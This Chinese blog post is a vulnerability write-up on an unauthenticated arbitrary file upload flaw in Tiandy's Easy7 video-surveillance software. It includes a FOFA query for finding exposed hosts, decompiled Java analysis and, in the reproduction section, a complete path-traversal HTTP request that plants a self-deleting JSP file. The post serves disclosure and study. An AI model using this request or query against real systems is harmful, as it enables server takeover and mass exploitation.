---
title: "天地伟业Easy7 uploadCheckImg 文件上传漏洞"
source: https://mrxn.net/jswz/easy7-file-uploadCheckImg-rce.html
asset_dir: assets/天地伟业easy7-uploadcheckimg-文件上传漏洞
---

# 天地伟业Easy7 uploadCheckImg 文件上传漏洞

[Mrxn](https://mrxn.net/author/1)* 发表于2026/2/11 08:23
* 288浏览
* [0评论](#comment)
* 58分钟阅读

深入探索

rest

服务器

REST


(adsbygoogle = window.adsbygoogle || []).push({});

---

# 漏洞简介

天地伟业Easy7是一款用于视频监控管理的软件系统。

漏洞修复方案

该系统的/Easy7/rest/file/uploadCheckImg接口存在前台的任意[文件上传](https://mrxn.net/tag/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0)接口，可构造请求包，上传webshell文件并保存在任意路径，从而控制服务器。漏洞利用难度极低，可在未登录的状态下直接发送恶意请求包造成利用，可能被蠕虫、黑客组织批量利用。

# 影响版本

# fofa语法

> body="/Easy7/apps/WebService/LogIn.jsp" || body="Easy7/VideoLib.EXE" || body="/Easy7/index.html" || (body="<img src=\"./images/ico/Easy7\_logo\_transparent.png") && title="平台"

# 漏洞分析

首先，该系统基于Spring 3.0，比较古老且WEB-INF/web.xml里没有配置任何filter进行权限校验，因此绝大部分接口都是可以直接访问的。

物流软件安全

再来看本次的[漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)接口 /Easy7/rest/file/uploadCheckImg 的对应方法`uploadCheckImg()`的实现逻辑

```
@Controller
@RequestMapping({"/file"})
public class CLS_REST_File {
    @Resource(
        name = "boSystemInfo"
    )
    private CLS_BO_SystemInfo boSystemInfo;
    @Resource(
        name = "boFile"
    )
    private CLS_BO_File boFile;
    @Resource(
        name = "boPROXY"
    )
    private CLS_BO_PROXY boPROXY;
    private static final Log log = LogFactory.getLog(CLS_REST_File.class);

    @RequestMapping({"/uploadCheckImg"})
    public void uploadCheckImg(HttpServletRequest request, HttpServletResponse response, CLS_VO_File voFile) throws Exception {
        CLS_VO_Result result = new CLS_VO_Result();
        PrintWriter out = response.getWriter();
        String fileName = voFile.getFileName();
        if (fileName == null) {
            fileName = UUID.randomUUID().toString();
            voFile.setFileName(fileName);
        }

        boolean isMultipart = ServletFileUpload.isMultipartContent(request);
        if (!isMultipart) {
            result.setRet(-7);
            out.print("<html><body><textarea>" + JSONObject.fromObject(result) + "</textarea></body></html>");
        } else {
            FileItemFactory factory = new DiskFileItemFactory();
            ServletFileUpload upload = new ServletFileUpload(factory);
            List<FileItem> items = null;

            try {
                items = upload.parseRequest(request);
            } catch (FileUploadException e) {
                result.setRet(-7);
                out.print("<html><body><textarea>" + JSONObject.fromObject(result) + "</textarea></body></html>");
                e.printStackTrace();
                return;
            }

            if (items == null) {
                result.setRet(-7);
                out.print("<html><body><textarea>" + JSONObject.fromObject(result) + "</textarea></body></html>");
            } else {
                File realFilePath = new File(CLS_Inquest_Type.PATHIMAGE + voFile.getUploadPicturePath());
                if (!realFilePath.exists() && !realFilePath.isDirectory()) {
                    realFilePath.mkdirs();
                }

                String newPath = "";
                Long size = null;

                for(FileItem fileItem : items) {
                    size = fileItem.getSize();
                    if (!fileItem.isFormField()) {
                        newPath = CLS_Inquest_Type.PATHIMAGE + voFile.getUploadPicturePath() + fileName;
                        File file = new File(newPath);

                        try {
                            fileItem.write(file);
                        } catch (Exception e) {
                            result.setRet(-7);
                            out.print("<html><body><textarea>" + JSONObject.fromObject(result) + "</textarea></body></html>");
                            e.printStackTrace();
                            return;
                        }
                    }
                }

                voFile.setFileSize(size);
                result.setRet(0);
                result.setContent(voFile);
                out.print("<html><body><textarea>" + JSONObject.fromObject(result) + "</textarea></body></html>");
            }
        }
    }
```

首先通过`voFile.getFileName()`控制写入文件名，其次是判断是不是文件上传（Content-Type是不是`multipart/`开头）

[![天地伟业Easy7 uploadCheckImg 文件上传漏洞](images/img-001-b1e084803a2b.webp)](https://image.mrxn.net/67e504ef83764ee68388bec2e06f6969.webp)

接下来就是commons.fileupload的基本操作

计算机科学

```
FileItemFactory factory = new DiskFileItemFactory();
ServletFileUpload upload = new ServletFileUpload(factory);
try {
    items = upload.parseRequest(request);
```

关键的[文件上传](https://mrxn.net/tag/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0)保存处理操作如下

```
for(FileItem fileItem : items) {
    size = fileItem.getSize();
    if (!fileItem.isFormField()) {
        newPath = CLS_Inquest_Type.PATHIMAGE + voFile.getUploadPicturePath() + fileName;
        File file = new File(newPath);

        try {
            fileItem.write(file);
```

其中`CLS_Inquest_Type.PATHIMAGE`为配置文件`WEB-INF/classes/config.properties`里固定的`file_path_base_img`值，一般为`file_path_base_img=/root/srsPath/`；

再结合用户可控的`voFile.getUploadPicturePath()`来拼接成最终保存文件的路径，因此整个利用链就非常清晰了，文件类型（后缀）可控，文件名可控，文件路径可控，基于这些就可以上传任意文件到任意目录了。

计算机服务器

但是需要解决不同架构或者版本的tomcat版本不一致问题，我们通过阅读 tomcat 的 `server.xml`配置，其中有如下映射

```
<Context  path="/share" docBase="/root/srsPath"
          reloadable="true"
          workDir="/root/srsPath">
</Context>

<Context  path="/imagelive" docBase="/root/tiandy/data"
          reloadable="true"
          workDir="/root/tiandy/data">
</Context>
```

我们可以上传到这`/root/srsPath`和`/root/tiandy/data`两个文件夹，通过访问`ip:port/share` 或者 `ip:port/imagelive` 来访问我们上传的文件，从而达到[命令执行](https://mrxn.net/tag/rce)的目的，或者在权限足够的时候，可以上传到crontab定时任务目录进行利用。

黑客与破解

# 漏洞复现

```
POST /Easy7/rest/file/uploadCheckImg?fileName=x.jsp&uploadPicturePath=%2F..%2F..%2Froot%2FsrsPath%2F HTTP/1.1
Host: easy7.mrxn.net
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary

------WebKitFormBoundary
Content-Disposition: form-data; name="file"; filename="1.png"
Content-Type: image/png

<%out.println(java.util.UUID.randomUUID().toString());new java.io.File(application.getRealPath(request.getServletPath())).delete();%>
------WebKitFormBoundary--
```

访问 `/share/x.jsp` 成功执行代码并删除自身

[![天地伟业Easy7 uploadCheckImg 文件上传漏洞](images/img-002-919220311feb.webp)](https://image.mrxn.net/dc1446954c794aaf88cf43983f8682ef.webp)

* 标签：
* [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
* [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
* [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
* [#Java](https://mrxn.net/tag/Java)
* [#rce](https://mrxn.net/tag/rce)
* [#文件上传](https://mrxn.net/tag/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0)

---


// 获取当前脚本所在的父容器
const parentContainer = document.currentScript.parentElement;
let searchContainer = parentContainer.querySelector('article') || parentContainer;
if (searchContainer) {
// 优先在 class 名为 prose 或 markdown 的容器内搜索 img 图片
let images = [];
const containers = searchContainer.querySelectorAll('.prose, .markdown');
containers.forEach(function(container) {
images = images.concat(Array.from(container.querySelectorAll('img')));
});
if (images.length === 0) {
images = searchContainer.querySelectorAll('img');
}
images.forEach(function(img) {
if (img.getAttribute('data-action') === 'zoom') {
const parentLink = img.parentNode;
if (parentLink.tagName === 'A') {
parentLink.setAttribute('data-fancybox', 'gallery');
}
} else {
const link = document.createElement('a');
link.setAttribute('data-fancybox', 'gallery');
link.setAttribute('href', img.getAttribute('src'));
img.parentNode.insertBefore(link, img);
link.appendChild(img);
}
});
// 初始化 Fancybox
Fancybox.bind("[data-fancybox]", {
// 您的自定义选项
});
}

文章目录
×

* [1.漏洞简介](#toc-1-)
* [2.影响版本](#toc-2-)
* [3.fofa语法](#toc-3-)
* [4.漏洞分析](#toc-4-)
* [5.漏洞复现](#toc-5-)



.x\_nav\_toc {
position: fixed;
top: 0;
right: -300px;
width: 280px;
height: 100%;
background-color: white;
box-shadow: -2px 0 15px rgba(0, 0, 0, 0.1);
z-index: 1000;
transition: right 0.3s ease;
display: flex;
flex-direction: column;
overflow: hidden;
padding-top: 10px;
}
.x\_nav\_toc.active {
right: 0;
}
.x\_toc\_header {
display: flex;
justify-content: space-between;
align-items: center;
padding: 15px 20px;
height: 48px;
border-bottom: 1px solid #eee;
}
.x\_toc\_title {
font-size: 18px;
font-weight: bold;
color: #333;
}
.x\_toc\_close {
background: none;
border: none;
font-size: 24px;
cursor: pointer;
color: #777;
transition: color 0.2s;
}
.x\_toc\_close:hover {
color: #333;
}
.x\_toc\_content {
flex: 1;
overflow-y: auto;
padding: 15px 20px;
padding-right: 10px;
}
.x\_anchor-list {
list-style-type: none;
padding: 0;
margin: 0;
}
/\* 减小目录项间距 \*/
.x\_anchor-list li {
margin-bottom: 4px; /\* 间距从8px减小到4px \*/
}
.x\_anchor-list a {
text-decoration: none;
color: #555;
display: block;
padding: 6px 10px; /\* 减少内边距 \*/
transition: all 0.2s;
font-size: 14px;
border-radius: 4px;
line-height: 1.4; /\* 减小行高 \*/
}
.x\_anchor-list a:hover,
.x\_anchor-list a:focus {
background-color: #f8f9fa;
color: #0068d6;
}
.toc-number {
font-weight: 600;
margin-right: 8px;
color: #495057;
display: inline-block;
min-width: 25px;
}
/\* 减小各级标题间距 \*/
.toc-h1 {
font-weight: 600;
font-size: 15px;
margin-top: 10px; /\* 上边距从15px减小到10px \*/
padding-left: 5px !important;
}
.toc-h2 {
font-size: 14px;
padding-left: 15px !important; /\* 缩进从20px减小到15px \*/
}
.toc-h3 {
font-size: 13px;
padding-left: 25px !important; /\* 缩进从30px减小到25px \*/
}
.toc-h4 {
font-size: 12px;
padding-left: 35px !important; /\* 缩进从40px减小到35px \*/
}
/\* 修改后的切换按钮样式 - 使用图标且位置下移 \*/
.x\_toc\_toggle {
position: fixed;
bottom:120px; right: 17px;width:40px;height:40px;background-color:white;
border-radius: 50%;
border: none;
cursor: pointer;
box-shadow: 0 4px 12px rgba(0,0,0,0.15);
z-index: 999;
transition: all 0.3s ease;
display: flex;
align-items: center;
justify-content: center;
padding: 0;
}
.x\_toc\_toggle svg {
width:24px;height:24px;stroke:#3d9bff;
}
.x\_toc\_toggle:hover {
#background-color: #0081f8;
transform: translateY(-3px);
box-shadow: 0 6px 15px rgba(0,0,0,0.2);
}
@media (max-width: 768px) {
.x\_nav\_toc {
width: 280px;
}
.x\_toc\_toggle {
bottom: 100px; /\* 手机端也下移位置 \*/
right: 30px;
width: 40px;
height: 40px;
}
.x\_toc\_toggle svg {
width: 20px;
height: 20px;
}
}

document.addEventListener('DOMContentLoaded', function() {
// 获取所有标题元素
var className = ".line-numbers";
var selectors = [];
for (var i = 1; i <= 6; i++) {
selectors.push(className + ' h' + i);
}
var headings = document.querySelectorAll(selectors.join(', '));
// 获取DOM元素
var tocContainer = document.querySelector('.x\_nav\_toc');
var toggleButton = document.querySelector('.x\_toc\_toggle');
var tocList = document.querySelector('.x\_anchor-list');
var closeButton = document.querySelector('.x\_toc\_close');
var currentHighlight = null;
// 检测是否为移动设备
const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
// 如果没有标题，隐藏所有元素
if (headings.length === 0) {
tocContainer.style.display = 'none';
toggleButton.style.display = 'none';
return;
}
// 初始化层级计数器
var counters = [0, 0, 0, 0, 0, 0]; // h1-h6
var currentLevel = 0;
// 生成带数字编号的目录
headings.forEach(function(heading, index) {
var level = parseInt(heading.tagName[1]);
// 更新计数器
counters[level - 1] += 1; // 增加当前级别计数器
// 重置更低级计数器
for (var i = level; i < 6; i++) {
counters[i] = 0;
}
// 生成编号字符串（如"1.2.3"）
var numberParts = [];
for (var i = 0; i < level; i++) {
if (counters[i] > 0) {
numberParts.push(counters[i]);
}
}
var numberText = numberParts.join('.')+'.';
// 创建唯一ID
var id = 'toc-' + numberText.replace(/\./g, '-');
heading.id = id;
var listItem = document.createElement('li');
var anchor = document.createElement('a');
var numberSpan = document.createElement('span');
numberSpan.className = 'toc-number';
numberSpan.textContent = numberText;
anchor.appendChild(numberSpan);
anchor.innerHTML += heading.textContent;
anchor.href = '#' + id;
anchor.classList.add('toc-h' + level);
listItem.appendChild(anchor);
tocList.appendChild(listItem);
// 添加点击事件（不关闭目录）
anchor.addEventListener('click', function(e) {
e.preventDefault();
// 更新高亮状态
if (currentHighlight) {
currentHighlight.classList.remove('active');
}
this.classList.add('active');
currentHighlight = this;
// 滚动到对应位置
var targetId = this.getAttribute('href').substring(1);
var targetElement = document.getElementById(targetId);
if (targetElement) {
var header = document.querySelector("header");
var headerHeight = header ? header.offsetHeight : 0;
var elementPosition = targetElement.getBoundingClientRect().top + window.pageYOffset;
var offsetPosition = elementPosition - headerHeight - 20;
window.scrollTo({
top: offsetPosition,
behavior: 'smooth'
});
// 滚动到目录项的可视区域
this.scrollIntoView({behavior: 'smooth', block: 'nearest'});
// 点击事件中
if (isMobile) {
closeToc(); // 移动端点击后关闭目录
}
}
});
});
// 切换按钮点击事件
toggleButton.addEventListener('click', function() {
tocContainer.classList.add('active');
});
// 关闭按钮点击事件
closeButton.addEventListener('click', function(e) {
e.stopPropagation();
closeToc();
});
// 滚动时更新高亮状态
window.addEventListener('scroll', function() {
var fromTop = window.scrollY;
var header = document.querySelector("header");
var headerHeight = header ? header.getBoundingClientRect().height : 0; // 更精确的header高度
//console.log(headerHeight);
// 精准计算标题文档位置
var activeSection = null;
headings.forEach(function(heading) {
var section = document.getElementById(heading.id);
if (!section) return;
// 使用getBoundingClientRect获取精确位置
var rect = section.getBoundingClientRect();
var sectionTop = rect.top + fromTop; // 转换为文档顶部绝对位置
var sectionBottom = rect.bottom + fromTop + headerHeight;
// 增加20px激活区域缓冲
if (fromTop + headerHeight + 20 >= sectionTop && fromTop < sectionBottom) {
activeSection = heading;
}
});
// 更新高亮状态（新增精确边界判断）
if (activeSection) {
var tocLink = tocList.querySelector('a[href="#' + activeSection.id + '"]');
if (tocLink && currentHighlight !== tocLink) {
if (currentHighlight) {
currentHighlight.blur();
currentHighlight.classList.remove('active');
}
tocLink.classList.add('active');
tocLink.focus();
currentHighlight = tocLink;
// 平滑滚动到可视区域（改进触发条件）
var tocRect = tocLink.getBoundingClientRect();
var tocContainerRect = tocContainer.getBoundingClientRect();
if (tocRect.bottom > tocContainerRect.bottom || tocRect.top < tocContainerRect.top) {
tocLink.scrollIntoView({behavior: 'auto', block: 'nearest'});
}
}
}
});
// 关闭目录面板
function closeToc() {
tocContainer.classList.remove('active');
}
});

/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
#qrcode-right {
display: none;
}
}

版权所有：[Mrxn's Blog](https://mrxn.net/)  
文章标题：[天地伟业Easy7 uploadCheckImg 文件上传漏洞](https://mrxn.net/jswz/easy7-file-uploadCheckImg-rce.html)  
文章链接：<https://mrxn.net/jswz/easy7-file-uploadCheckImg-rce.html>  
本站文章均为原创，未经授权请勿用于任何商业用途。仅供安全研究和学习使用。若因传播、利用本文档信息而产生任何直接或间接的后果或损害，均由使用者自行承担，文章作者不为此承担任何责任。

漏洞修复方案

![](data:image/png;base64,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)

设备上扫码阅读


var qrcode = new QRCode(document.getElementById("copyright-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/easy7-file-uploadCheckImg-rce.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});

  

### 📚 推荐阅读

* [深信服运维安全管理系统 install\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-install_patch-rce.html)
* [深信服运维安全管理系统 del\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-del_patch-rce.html)
* [深信服运维安全管理系统 upload\_file 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-cssp-app-upload_file-rce.html)
* [深信服运维安全管理系统 csspost/update 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-csspost-update-rce.html)
* [深信服运维安全管理系统 save\_SNMP 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-SNMP-save_SNMP-rce.html)
* [深信服运维安全管理系统 getLdap 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-getLdap-rce.html)
* [深信服运维安全管理系统 Jwt 密钥硬编码](https://mrxn.net/jswz/sangfor_osm-login-search_login-token-leak.html)
* [深信服运维安全管理系统 del\_route 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_route-rce.html)
* [深信服运维安全管理系统 del\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_net-rce.html)
* [深信服运维安全管理系统 change\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-change_net-rce.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 updateLoginName SQL注入漏洞](https://mrxn.net/jswz/bigant-user-updateLoginName-sqli.html)
* [九佳易管理系统 PrivilegedCodeDestroy.asmx SQL注入漏洞](https://mrxn.net/jswz/a8erp-Interface-licx-PrivilegedCodeDestroy-sqli.html)
* [九佳易管理系统 Ajax\_XT.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-Ajax_XT-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 moveDept SQL注入漏洞](https://mrxn.net/jswz/bigant-dept-moveDept-sqli.html)
* [青龙面板最新版v2.20.1 鉴权绕过致RCE漏洞](https://mrxn.net/jswz/qinglong-auth-bypass-rce.html)
* [九佳易管理系统 picHY.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-HuiYuanDangAn-picHY-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 安装程序二次注入致远程代码执行漏洞](https://mrxn.net/jswz/bigant-install-config-rce.html)
* [东胜物流软件 MsChDuiController 多个SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsChDuiController-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 PublicController 任意文件读取漏洞](https://mrxn.net/jswz/bigant-Public-download.html)
* [东胜物流软件 MsAnnounceController SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsAnnounce-GetData-sqli.html)

安全运维咨询

  

/\* 底部展示样式 \*/
.qrcode-bottom-box {
margin: 40px auto;
text-align: center;
}
.qrcode-title {
font-size: 16px;
color: #666;
margin-bottom: 0px;
font-weight: bold;
text-align: center;
}
.qrcode-bottom-box img {
display: inline-block;
padding: 10px;
background: #fff;
border-radius: 8px;
margin: 10px auto;
}
/\* 悬浮展示样式 \*/
.qrcode-float {
position: fixed;
z-index: 9999;
background: rgba(255,255,255,0.98);
padding: 20px;
border-radius: 12px;
}
.qrcode-float:hover {
transform: scale(1.05);
}
/\* 移动端适配 \*/
@media (max-width: 1440px) {
.qrcode-float {
right: 2%;
transform: none;
}
}
/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
.qrcode-float {
display: none;
}
}

![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAGQAAABkCAYAAABw4pVUAAAK2UlEQVR4AeyZAXbbSA5E/XP/O8+61PMpCOymJK9tKbvMS7mAQgGkG2RG9vz5+Pj456v4p/2pcyyp9Vw9bK1zah1HHmv3euLTkzgwP+L4KqpXvWpfibOQz77z77ucwLaQzw1/PIp+88AH0OVL7kxg57F2MZYvsPbCqMHg0naZD2yS84FLbSscBPaEVzYY8+IR3av+CNfebSFVPOPXncBuITC2D3u+d5v1aYDRb48186/yI3O6p+e5thrc3mdq3wkY82HPs+vsFjIzndrvncC3LgSuT4HfAgzN3CczrLbieET3qM8YxjXhlvuMmjtnps1q8cF1fvLvwLcu5Dtu6P99xksXAuMJ60uYPZEwvHCfneccGfa9vWZvGPZ+IKUfw0sX8mPf1V88+GcW8hcfyKtvfbcQX+EZP3Oz9vce4PJDGrD9INo9j+TOn7H9cL0WXK+Xnu4xrxxfoJZ4BT2dV/7o3Zt8t5CIJ153AttC4PZpgnW+ut1sXcDoX+XRYXicB/Mcrk+3XhlGD6C0ca4RbMIkSD2YlHZvMnDR9MLIAaWNgYsX7vPW9BlsC/mMz79vcAJ/8nR8Fd6//ebhrpnD9YnpWvoqrIerXuPURNVrPKurwbif6u8xzD3OCNuT+L/B+YZ4km/Cu4XA/GnI/cKowZzjETA8qzw6DE9/olILYNSBpDcAlv9G3xg/E1h7V9f+bNv+dg+MeZvhM4BbDUYO9/mzffu7W8hWOYOXnMAfuN2gT4N3A9e6WveYw97be/RW1gOj37wy3NZqv3H1J4b7PXDrSd93wnsL97nRgqr/TW9Ive//2fhcyJutdvvY+8h95fUKYLzmiQMYeZ0RPahaYhhe2HP8QXxBYpG8AkZ/1Xq86o0P5v0wdCC2C4DLB4hL8vnFuTB04FO9/avnVh1ZrwGX+cDH+YZ8vNef3UJgbOvoNt0w3HrVw6v+1Dq6F8ZcuLI93ftIbi/s51lzjnlY7RGOP+heuF6z18zTJ3YL0XTya05g+9jr5d2U+YxhbL3XYOjwHHtNGH19bnIYNb3ROqzJMHr0qYfhtqZnxvEH1mD0RhMwNBis9xGG0QOc/w35eLM/d//J8gkIw9hk4gq/p5lm7YhhzNXjHPNw18xh9MKe0xfA/Vp8Hf0a1tXNK1uDcU3zyjBqMLj2311INZ/xz5/AuZCfP+OnrrBbCIzXCAbPpsGowWBfRxg5sGvTU1lT1RIDlx+UrM8Yhif+Dv1dr7meR9i+7oVxD7D/P5r2wNUDI+5zar5bSC2e8e+fwParEzfqLZjD2CpcnwJremX1cNfMYT8PhqZnxjA8MDjXCGbe6AEMLwyu3tQDNdh7YGgw5/QLuPU4d8b2WDMPn2+Ip/ImvPvB8JH7gvE0ZKPBIz164hdqna3PWC+MezCvDLc151RPj488vdbzzFKTo3Uc1fSeb4gn8Sa8LQTGU+UW4TaPDrfa0fcQf6AHRq95GPZa1WHUgcgXZGZwSdoX4ObTWXwB3Oqt7ZLC8MCV0xvA0BIHMPJL479fYK/9W9oIhgcGZ1YAIwfOX518vNmf7Q3xvmBsq+dw/ZQFc489RwyjF67zVv48PQKufcDWAlzeCmDTDIBLreeA0o69Xhi49CcONCcOzJ/l9Aazvt1CZqZTe/oEvtxwLuTLR/czjbuF5FVawVuwvsqjw3jdYXC0Ffo8fTB6AaWN7fkqO6j3A5d/pgAtWw5c4q1QAufA2lPsy3C3kKXzLPzKCWy/OulXg7FpeJzrDJ+YI67+xDCu9UgPDC/c58wOYO+NHsCo1WtHD9QSBzC8sOfUAxi1xPfg/PD5htw7rV+u7351AmOz2VZQ7yf5DHpg9MJzbL+zYfSrz1jvjPVb63l0NTlaYF4Zxv2kHtSacfQZrB8xjPnA+Y